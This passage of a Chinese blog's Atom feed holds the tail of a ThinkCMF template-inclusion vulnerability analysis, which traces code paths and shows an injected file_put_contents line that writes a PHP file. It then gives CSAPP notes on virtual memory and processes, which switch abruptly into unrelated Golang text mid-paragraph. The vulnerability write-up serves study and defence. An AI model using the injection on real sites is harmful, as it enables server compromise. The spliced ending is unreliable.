</span>&#123;</span><br></pre></td></tr></table></figure><blockquote><p>当扩展一个类，子类就会继承父类所有公有的和受保护的方法。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。 </p></blockquote><p>所以 IndexController 类有了父类的所有方法，这里列举一下所有 public 方法，说不定可以组合利用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// abstract class Controller</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> // 架构函数，取得模板对象实例</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__set</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">get</span><span class="params">($name = <span class="string">''</span>)</span>  // 取得模板显示变量的值</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__isset</span><span class="params">($name)</span>  // 检测模板变量的值</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__call</span><span class="params">($method, $args)</span> // 没戏，写死了，没有实现动态调用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//  <span class="title">class</span> <span class="title">AppframeController</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">_empty</span><span class="params">()</span>// 爆了个页面不存在的错</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">theme</span><span class="params">($theme)</span>// 模板主题设置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">// <span class="title">class</span> <span class="title">HomebaseController</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span><span class="params">()</span>  // 覆盖掉父类的</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span>  // 加载模板和页面输出 可以返回输出内容</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">parseTemplate</span><span class="params">($template = <span class="string">''</span>)</span>  // 自动定位模板文件</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">fetch</span><span class="params">($templateFile = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span>  // 获取输出页面内容</span></span><br></pre></td></tr></table></figure><p>目前来看，能造成敏感操作只有 <code>display()</code> 和 <code>fetch()</code> 了，继续跟进。</p><h3 id="display"><a href="#display" class="headerlink" title="display"></a>display</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">parent</span>::display(<span class="keyword">$this</span>-&gt;parseTemplate($templateFile), $charset, $contentType, $content, $prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parseTemplate()</code> 前面一大段没有对 <code>template</code> 进行处理，然后是文件就直接返回，这里不用关心了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HomebaseController.class.php line 170</span></span><br><span class="line"><span class="keyword">if</span> (is_file($template)) &#123;</span><br><span class="line">    <span class="keyword">return</span> $template;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模板显示 调用内置的模板引擎显示方法，</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $templateFile 指定要调用的模板文件</span></span><br><span class="line"><span class="comment"> * 默认为空 由系统自动定位模板文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $charset 输出编码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $contentType 输出类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $content 输出内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $prefix 模板缓存前缀</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;display($templateFile, $charset, $contentType, $content, $prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到 <code>$this-&gt;view-&gt;display()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 加载模板和页面输出 可以返回输出内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $templateFile 模板文件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $charset 模板输出字符集</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $contentType 输出类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $content 模板输出内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $prefix 模板缓存前缀</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    G(<span class="string">'viewStartTime'</span>);</span><br><span class="line">    <span class="comment">// 视图开始标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_begin'</span>, $templateFile);</span><br><span class="line">    <span class="comment">// 解析并获取模板内容</span></span><br><span class="line">    $content = <span class="keyword">$this</span>-&gt;fetch($templateFile, $content, $prefix);</span><br><span class="line">    <span class="comment">// 输出模板内容</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;render($content, $charset, $contentType);</span><br><span class="line">    <span class="comment">// 视图结束标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_end'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续看 <code>fetch()</code> 的实现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">'php'</span> == strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>))) &#123; <span class="comment">// 使用PHP原生模板，默认为 Thinkphp</span></span><br><span class="line">    $_content = $content;</span><br><span class="line">    <span class="comment">// 模板阵列变量分解成为独立变量</span></span><br><span class="line">    extract(<span class="keyword">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">    <span class="comment">// 直接载入PHP模板</span></span><br><span class="line">    <span class="keyword">empty</span>($_content) ? <span class="keyword">include</span> $templateFile : <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . $_content);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 视图解析标签</span></span><br><span class="line">    $params = <span class="keyword">array</span>(<span class="string">'var'</span> =&gt; <span class="keyword">$this</span>-&gt;tVar, <span class="string">'file'</span> =&gt; $templateFile, <span class="string">'content'</span> =&gt; $content, <span class="string">'prefix'</span> =&gt; $prefix);</span><br><span class="line">    Hook::listen(<span class="string">'view_parse'</span>, $params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这完成的文件读取。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbg30oaphkj20sr0880u9.jpg" alt="image.png"></p><p>然后编译模板。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 编译模板内容</span></span><br><span class="line">$tmplContent = <span class="keyword">$this</span>-&gt;compiler($tmplContent);</span><br><span class="line">Storage::put($tmplCacheFile, trim($tmplContent), <span class="string">'tpl'</span>);</span><br></pre></td></tr></table></figure><p>编译的过程中还稍微做了下安全处理，这里能绕吗？能！</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加安全代码</span></span><br><span class="line">$tmplContent = <span class="string">'&lt;?php if (!defined(\'THINK_PATH\')) exit();?&gt;'</span> . $tmplContent;</span><br><span class="line"><span class="comment">// 优化生成的php代码</span></span><br><span class="line">$tmplContent = str_replace(<span class="string">'?&gt;&lt;?php'</span>, <span class="string">''</span>, $tmplContent);  <span class="comment">// 这一句反而帮了倒忙</span></span><br></pre></td></tr></table></figure><p>再写入临时文件，其中文件名是 $templateFile 的 md5 哈希值。</p><p>最终 include 这个模板。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbg3923cglj20i904f0t9.jpg" alt="image.png"></p><p>文件包含到这里就结束了，相比 fetch，他多了个 render 的方法来进行输出，所以有回显。</p><p>继续看如何写 shell，str_replace 是怎么帮的倒忙。</p><p>作者原意是在模板前面加入退出语句，使得必须从单入口进入，但有了 include 之后，这个也不用管啦。</p><p>结合这个替换，模板内容中的 PHP 语句可以直接拼接上去，比如复现中给出的 payload 产生的效果：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (!defined(<span class="string">'THINK_PATH'</span>)) <span class="keyword">exit</span>(); file_put_contents(<span class="string">'i.php'</span>,<span class="string">'&lt;?php phpinfo(); ?&gt;'</span>);</span><br></pre></td></tr></table></figure><h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h3><p>有了上面的铺垫，fetch 这里分析起来就更简单了，而且不再需要传 templateFile 参数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    $templateFile = <span class="keyword">empty</span>($content) ? <span class="keyword">$this</span>-&gt;parseTemplate($templateFile) : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::fetch($templateFile, $content, $prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终处理的方法是一样的，不再赘述。</p><p>Comment 模块和 Api 模块都能调用到 fetch，所以也是触发点。</p><p>存在 SSTI 漏洞的 CMS 合集：<a href="https://xz.aliyun.com/t/5568" target="_blank" rel="noopener">https://xz.aliyun.com/t/5568</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果参数可控且不转义 <code>&lt;&gt;</code>，可以利用的还有<code>$this-&gt;show()</code>，这三个方法在 TP3 上是通用的。</p><p>看了一下其他人的分析文章，发现有些被带偏了，真的需要模板标签吗？display 真的不能写 shell 吗？</p><p>话说回来，如果 <code>&lt;?</code> 这种标签被过滤掉了，确实可以通过模板标签 <code>&lt;php&gt;&lt;/php&gt;</code> 解析来绕一下。</p><p>如何防御？最简单的就是将这些本不该 public 的方法“私有化”，最好的还是将传入参数尖括号编码。</p><p>不过，即使不能直接访问了，结合一些反序列化链这些方法或许还能利用。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.riskivy.com/thinkcmf-框架上的任意内容包含漏洞" target="_blank" rel="noopener">https://blog.riskivy.com/thinkcmf-%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://mochazz.github.io/2019/07/25/ThinkCMFX漏洞分析合集" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;ThinkCMF 是一款基于 PHP+MYSQL 开发的中文内容管理框架，底层采用 ThinkPHP3.2.3 构建。&lt;/p&gt;
&lt;p&gt;远程攻
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
      <category term="ThinkPHP" scheme="https://wywwzjj.top/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 虚拟存储器 笔记</title>
    <link href="https://wywwzjj.top/2019/11/11/CSAPP-Chapter-9-Notes/"/>
    <id>https://wywwzjj.top/2019/11/11/CSAPP-Chapter-9-Notes/</id>
    <published>2019-11-11T14:57:57.000Z</published>
    <updated>2020-03-22T10:11:48.056Z</updated>
    
    <content type="html"><![CDATA[<p>一个系统中的进程是与其他进程共享 CPU 和主存资源的。然而，共享主存会形成一些特殊的挑战。</p><p>虚拟内存提供了三个重要的能力：</p><ul><li>它将主存看成是一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在主存之间来回传送数据，通过这种方式，它高效地使用了主存。</li><li>它为每个进程提供了一致的地址空间，从而简化了内存管理。</li><li>它保护了每个进程的地址空间不被其他进程破坏。</li></ul><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgromwsnaj20hu0g3q5d.jpg" alt="image.png"></p><h2 id="内存管理要干些啥？"><a href="#内存管理要干些啥？" class="headerlink" title="内存管理要干些啥？"></a>内存管理要干些啥？</h2><ul><li><p>内存空间的分配与回收</p></li><li><p>内存空间的扩充</p><ul><li>覆盖技术</li><li>交换技术</li><li>虚拟存储</li></ul></li><li><p>地址转换：逻辑 =&gt; 物理</p></li><li><p>存储保护：保证各进程只在自己的内存空间访问，不会越界</p><ul><li>上下界寄存器</li><li>重定位寄存器 + 界地址寄存器</li></ul></li></ul><h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h3><p>LWN.net 上有一系列的 “<strong>What every programmer should know about memory</strong>” 文章你需要读一下。当然，你可以直接访问一个完整的 <a href="http://futuretech.blinkenlights.nl/misc/cpumemory.pdf" target="_blank" rel="noopener">PDF 文档</a>。下面是这个系列文章的网页版列表。读完这个列表的内容，你基本上就对内存有了一个比较好的知识体系了。</p><ul><li><a href="https://lwn.net/Articles/250967/" target="_blank" rel="noopener">Part 1: Introduction</a> ，中译版为 “<a href="https://www.oschina.net/translate/what-every-programmer-should-know-about-memory-part1" target="_blank" rel="noopener">每个程序员都应该了解的内存知识【第一部分】</a>”</li><li><a href="https://lwn.net/Articles/252125/" target="_blank" rel="noopener">Part 2: CPU caches</a></li><li><a href="http://lwn.net/Articles/253361/" target="_blank" rel="noopener">Part 3 (Virtual memory)</a></li><li><a href="http://lwn.net/Articles/254445/" target="_blank" rel="noopener">Part 4 (NUMA systems)</a></li><li><a href="http://lwn.net/Articles/255364/" target="_blank" rel="noopener">Part 5 (What programmers can do - cache optimization)</a></li><li><a href="http://lwn.net/Articles/256433/" target="_blank" rel="noopener">Part 6 (What programmers can do - multi-threaded optimizations)</a></li><li><a href="http://lwn.net/Articles/257209/" target="_blank" rel="noopener">Part 7 (Memory performance tools)</a></li><li><a href="https://lwn.net/Articles/258154/" target="_blank" rel="noopener">Part 8 (Future technologies)</a></li><li><a href="https://lwn.net/Articles/258188/" target="_blank" rel="noopener">Part 9 (Appendices and bibliography)</a></li></ul><h2 id="连续分配"><a href="#连续分配" class="headerlink" title="连续分配"></a>连续分配</h2><p>分类：</p><ul><li>单一连续：只支持单道程序，内存分为系统区和用户区</li><li>固定分区</li><li>动态分区：在程序被装入内存时，根据进程的大小动态调整分区<ul><li>首次适应</li><li>最佳适应</li><li>最坏适应</li><li>邻近适应</li></ul></li></ul><p>缺点：</p><ul><li>分配给一个程序的物理内存是连续的</li><li>内存利用率低</li><li>有内外碎片问题</li></ul><h2 id="非连续分配"><a href="#非连续分配" class="headerlink" title="非连续分配"></a>非连续分配</h2><p>优点：</p><ul><li>一个程序的物理地址空间是非连续的</li><li>更好的内存利用和管理</li><li>允许共享代码与数据（共享库等）</li><li>支持动态加载和动态链接</li></ul><p>缺点：</p><ul><li>如何建立虚拟地址和物理地址之间的转换<ul><li>软件方案</li><li>硬件方案</li></ul></li></ul><h2 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h2><p>段是信息的逻辑单位。</p><p>分段的目的是更好地满足用户需求。</p><p>一个段通常包含着一组属于一个逻辑模块的信息，更容易实现信息的共享和保护。</p><p>分段对用户是可见的，用户编程时需要显式给出段名。</p><p>段的大小不固定，取决于用户编写的程序（低级语言）。</p><ul><li><p>程序text段</p><ul><li>库</li><li>用户代码</li></ul></li><li><p>程序数据段</p></li><li><p>运行栈</p></li><li><p>堆</p></li></ul><p>段表：段号、段长、基址</p><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>页是信息的物理单位。分页的目的是为了实现离散分配，提高内存利用率。</p><p>分页仅仅是系统管理上的需要，完全是系统行为，对用户不可见。</p><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>作用：记录进程中各个页与所占用内存块的关系，形成映射。</p><h3 id="快表"><a href="#快表" class="headerlink" title="快表"></a>快表</h3><h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>单页表遇到的问题：</p><ul><li>页表必须连续存放，若页表项小，总的页表太占空间；页表项过大，内碎片影响大。</li><li>没有必要让所有页表常驻内存，进程在一段时间内可能只需要访问几个特定的页面。</li></ul><p>实现对页表本身的虚拟存储。</p><p>注意：</p><ul><li>各级页表的大小不能超过一个页面。若两级不够，可分成多级</li><li>多级页表访存次数（无快表） = 页表级数 + 1</li></ul><h2 id="段页"><a href="#段页" class="headerlink" title="段页"></a>段页</h2><p>进程分段 =》段分页 =》内存分块</p><p>维护一个段表和若干个页表</p><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>程序不需全部装入即可运行，运行时根据需要动态调入数据，若内存不够，还需换出一些数据。</p><h3 id="请求调页"><a href="#请求调页" class="headerlink" title="请求调页"></a>请求调页</h3><p>访问的信息不在内存时，由操作系统负责将所需信息从外存调入内存</p><p>页表结构：内存块号    中断位P    访问位A    修改位M    外存地址</p><p>缺页中断与一般的 I/O 中断区别：</p><ul><li>缺页中断是指令执行时中断，而普通的是两条指令执行之间。</li><li>缺页中断是运行状态，而普通的是阻塞态。</li></ul><h3 id="页面置换"><a href="#页面置换" class="headerlink" title="页面置换"></a>页面置换</h3><p>内存空间不够时，将内存中暂时用不到的信息换出到外存，换出时注意清掉快表中的缓存。</p><p>理想置换算法要求：被换出的页面在以后的运行中不需要。</p><ul><li><p>先进先出（FIFS）</p><p>  往下挤。实现简单，性能差，可能出现 Belady 现象，即增加内存块后，缺页中断却增加。</p></li><li><p>最近最久未使用（LRU）</p><p>  依然是往下挤，区别在于，一旦命中，提到栈顶。</p></li><li><p>最近最不常用（LFU）</p><p>  记录访问次数，淘汰访问次数最小的，但这样实现太麻烦，所以直接在对应的内存块上计数。</p></li><li><p>最近未使用（NRU）</p><p>  搞一个定时器，定期清除访问位。</p></li><li><p>二次机会（Second Chance）</p><p>  一般来说不用管改进算法，只要 A</p><p>  请求调页时，不算访问，之后的命中才算，而且从时间最久开始，遇到0就直接淘汰，遇1置0。</p><p>  置换掉的页作为最新页放顶上，注意是按时钟旋转，而不是直接往下挤。</p><p>  改进后的算法加了一个判断位——修改位M，减少了I/O，也降低了抖动现象。</p></li><li><p>页缓冲</p></li></ul><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><ul><li>简化链接</li><li>简化加载</li><li>简化共享</li><li>简化内存分配</li></ul><h2 id="物理和虚拟寻址"><a href="#物理和虚拟寻址" class="headerlink" title="物理和虚拟寻址"></a>物理和虚拟寻址</h2><p>计算机系统的主存被组织成一个由 M 个连续的字节大小的单元组成的数组。每个字节都有一个唯一的物理地址。</p><p>在物理地址与虚拟地址间加个地址翻译就构成了虚拟寻址。</p><h2 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h2><p>地址空间是一个非负整数地址的有序集合。</p><p>地址空间的概念是很重要的，因为它清楚地区分了数据对象（字节）和他们的属性（地址）。</p><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>内存成了对硬盘的缓存，虚拟页面可划分为未分配的、未缓存的和已缓存的。</p><h2 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h2><p>逻辑地址到物理地址</p><h2 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h2><p>回到本章前言，“虚拟内存是强大的”。</p><ul><li>你知道可以通过读写内存位置读或者修改一个磁盘文件的内容吗？</li><li>可以加载一个文件的内容到内存中，而不需要进行任何显示地复制吗？</li></ul><p>将一个文件或其他对象映射到进程的地址空间，实现文件磁盘地址和进程地址空间中一段虚拟地址的一一对应。</p><p>实现了这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用 read、write 等系统调用函数。</p><p>相反，内核空间对这段区域的修改也直接反应用户空间，从而可以实现不同进程的文件共享。</p><p>简单总结，有如下特点：</p><ul><li>提高数据的读、写和传输的时间性能<ul><li>减少了数据拷贝次数</li><li>用户空间和内核空间的高效交互（通过映射区域直接交互）</li><li>用内存读写代替 I/O 读写</li></ul></li><li>提高内存利用率：通过虚拟内存、共享对象</li></ul><h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><p>为什么要动态分配内存？因为很多时候只有在运行时才知道某些数据结构的大小。</p><p>malloc 与 mmap、munmap 区别是什么？</p><h3 id="分配器"><a href="#分配器" class="headerlink" title="分配器"></a>分配器</h3><p>这一部分可以借鉴操作系统为进程分配内存的操作。</p><h2 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h2><p>一个进程终止后，其占用的内存由操作系统来释放和重新分配。</p><p>进程存活时，释放掉不用的内存就得交给程序本身了，C / C++ 把这活交给了程序员，Java 这类的有自己的垃圾回收器。</p><h3 id="回收器"><a href="#回收器" class="headerlink" title="回收器"></a>回收器</h3><h2 id="C-中常见的内存错误"><a href="#C-中常见的内存错误" class="headerlink" title="C 中常见的内存错误"></a>C 中常见的内存错误</h2><ul><li>间接引用坏指针</li><li>读未初始化的内存</li><li>允许栈缓冲区溢出</li><li>假设指针和他们指向的对象是相同的大小</li><li>造成错位错误</li><li>引用指针，而不是它所指向的对象</li><li>误解指针运算</li><li>引用不存在的变量</li><li>引用空闲堆块中的数据</li><li>引起内存泄露</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个系统中的进程是与其他进程共享 CPU 和主存资源的。然而，共享主存会形成一些特殊的挑战。&lt;/p&gt;
&lt;p&gt;虚拟内存提供了三个重要的能力：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它将主存看成是一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在主存之间来回传送数据
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 异常控制流 笔记</title>
    <link href="https://wywwzjj.top/2019/10/28/CSAPP-Chapter-8-Notes/"/>
    <id>https://wywwzjj.top/2019/10/28/CSAPP-Chapter-8-Notes/</id>
    <published>2019-10-28T13:13:22.000Z</published>
    <updated>2020-03-22T10:11:48.055Z</updated>
    
    <content type="html"><![CDATA[<p>应用是如何与操作系统进行交互的？</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。</p><p>在任何情况下，当处理器检测到有事件发生时，它就会通过一张叫做异常表的跳转表，进行一个间接过程调用，到一个专门设计用来处理这类事件的操作系统子程序（异常处理程序）。</p><p>理解的还是比较模糊，得调调源码看看细节。</p><h3 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h3><ul><li>中断</li><li>陷阱</li><li>故障</li><li>终止</li></ul><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p><strong>关键抽象：</strong></p><ul><li>一个独立的逻辑控制流，它提供一个假象，好像程序独占了处理器。</li><li>一个私有的地址空间，它提供了一个假象，好像程序独占了内存系统。</li></ul><h3 id="进程实体"><a href="#进程实体" class="headerlink" title="进程实体"></a>进程实体</h3><p>程序段、数据段、PCB 三部分组成了进程实体（进程映像）。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>传统定义：</p><ul><li>进程是程序的一次执行过程</li><li>进程是一个程序及其数据在处理机上顺序执行时所发生的活动</li><li>进程是具有独立功能的程序在数据集合上运行的过程，它是系统进行资源分配和调度的一个独立单位</li></ul><p>进程是进程实体的运行过程，是系统进行<strong>资源分配</strong>和<strong>调度</strong>的一个独立单位。</p><p>一道程序在一个数据集上的一次执行过程。</p><h3 id="PCB"><a href="#PCB" class="headerlink" title="PCB"></a>PCB</h3><ul><li><p>基本描述信息</p><ul><li><p>进程名（通常用文件名或命令名称表示）</p></li><li><p>进程标识符 PID（唯一标识符）</p></li><li><p>用户标识符 UID</p></li><li><p>当前进程状态</p></li></ul></li><li><p>管理信息</p><ul><li>程序和数据的地址</li><li>I/O 操作相关参数</li><li>进程通信信息</li></ul></li><li><p>控制信息</p><ul><li>现场信息（各种寄存器值，进程切换时这些运行情况都要保存到PCB中）</li><li>调度参数</li><li>同步、互斥信号量</li></ul></li></ul><h3 id="组织形式"><a href="#组织形式" class="headerlink" title="组织形式"></a>组织形式</h3><ul><li><p>链接方式：按照进程状态将 PCB 分为多个队列，操作系统持有指向各个队列的指针</p></li><li><p>索引方式：根据进程状态的不同，建立几张索引表（底层是个啥），操作系统持有指向各个索引表的指针</p></li></ul><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul><li>动态性：进程是程序的一次执行过程，是动态地产生、变化和消亡的（最基本的特征）</li><li>并发性：内存中有多个进程实体，各进程可并发执行</li><li>独立性：进程是操作系统分配资源的基本单位，一个进程的程序和数据只能由该进程本身访问。</li><li>异步性：各进程按各自独立的、不可预知的速度向前推进，操作系统要提供“进程同步机制”来解决异步问题</li><li>结构性：每个进程都配置一个 PCB。结构上来看，进程由程序段、数据段和PCB组成</li></ul><h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><p>运行态：CPU、其他资源均满足</p><p>就绪态：已具备运行条件，只欠CPU</p><p>阻塞态：因等待某一事件而不能执行。CPU、其他资源均不满足。等待操作系统或其他进程唤醒。</p><p>创建态：操作系统为进程分配资源、初始化PCB</p><p>终止态：进程正在从系统中撤销，操作系统将回收进程所拥有的资源、撤销PCB</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgrb7tzr2j20ol0fx10g.jpg" alt="image.png"></p><p>注意：</p><ul><li><p>不能由阻塞态直接转换为运行态</p><p>  申请的资源被分配，或等待时间发生了，只代表其他资源满足，此时进入就绪态，还要等CPU。</p></li><li><p>不能由就绪态转换成阻塞态。</p><p>  因为进入阻塞态需要进程主动请求，必然需要在运行时才能发出请求。</p></li></ul><h3 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h3><h3 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h3><h3 id="私有地址空间"><a href="#私有地址空间" class="headerlink" title="私有地址空间"></a>私有地址空间</h3><h3 id="用户模式和内核模式"><a href="#用户模式和内核模式" class="headerlink" title="用户模式和内核模式"></a>用户模式和内核模式</h3><p>运行应用程序代码的进程初始时是在用户模式中的。进程从用户模式变为内核模式的唯一方法时通过诸如中断、故障或者陷入系统调用这样的异常。当异常发生时，控制传递到异常处理程序，处理器从用户模式变为内核模式。处理程序运行在内核模式中，当它返回到应用程序代码时，处理器就把模式从内核模式改回到用户模式。</p><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><p>上下文是由程序正确运行所需的状态组成的。</p><p>这个状态包括存放在内存中的程序的代码和数据，以及它的栈、寄存器、PC、环境变量和打开文件描述符的集合。<br>Golang 从 2009 年正式发布以来，依靠其极高运行速度和高效的开发效率，迅速占据市场份额。Golang 从语言级别支持并发，通过轻量级协程 Goroutine 来实现程序并发运行。</p><p>Goroutine 非常轻量，主要体现在以下两个方面：</p><p>上下文切换代价小： Goroutine 